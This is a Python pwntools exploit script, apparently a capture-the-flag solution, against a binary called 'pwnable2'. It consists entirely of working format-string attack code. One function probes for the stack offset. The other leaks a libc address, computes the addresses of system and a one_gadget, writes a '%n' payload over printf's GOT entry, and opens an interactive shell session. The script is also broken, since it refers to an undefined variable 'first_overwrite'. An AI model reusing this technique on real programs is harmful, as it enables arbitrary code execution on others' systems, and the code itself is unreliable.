from pwn import *

binary = ELF("./pwnable2", checksec = False)

def offset_finder():
    # By using this function we can find out that our input is stored at offset eleven of the stack

    for x in range (1, 100):
        p = process("./pwnable2")
        # p = remote("stack.overflow.fail", 9002)
        
        print "Offset number {}".format(x)

        payload = ""
        payload += "A" * 8
        payload += "%{}$p".format(x)

        p.sendline(payload)
        
        p.recvuntil("AAAAAAAA")
        stack_value = p.recvuntil(" ")
        
        if stack_value.find("41414141") != -1:
            print "Offset found!"
            print "Stack value: {}".format(stack_value)
            break
        else:
            print "Stack value: {}".format(stack_value)
            
        p.close()

def exploit():
    p = process("./pwnable2")
    binary = ELF("pwnable2")
    printf_got = 0x601020

    p.sendline("%17$p")
    p.recvuntil("do?\n")
    
    libc_leak = p.recvuntil(" ")
    libc_leak = int(libc_leak, 16)
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc_base = libc_leak - 0x021b97
    log.info("Libc base : {}".format(hex(libc_base)))
    libc_system = libc_base + 0x04f440
    log.info("Libc system : {}".format(hex(libc_system)))
    one_gadget = libc_base + 0x10a38c
    log.info("One gadget addr : {}".format(hex(one_gadget)))
    overwrite = str(hex(libc_system))[2:]
    to_overwrite = int(overwrite[4:], 16)
    log.info("overwrite: {} or in hex {}".format(to_overwrite, hex(to_overwrite)))
    
    payload = ''
    payload += '%{}p'.format(first_overwrite)
    payload += '%{}$n'.format(4 + (16 / 4))
    payload = payload.ljust(16, 'A')
    payload += p64(printf_got)
    print len(payload)
    
    # gdb.attach(p, '''
    #                 b *0x0000000000400762
    #                 b *0x000000000040076c
    #                 c
    #                 ''')
    p.sendline(payload)
    
    p.interactive()

if __name__ == "__main__":
    # offset_finder()
    exploit()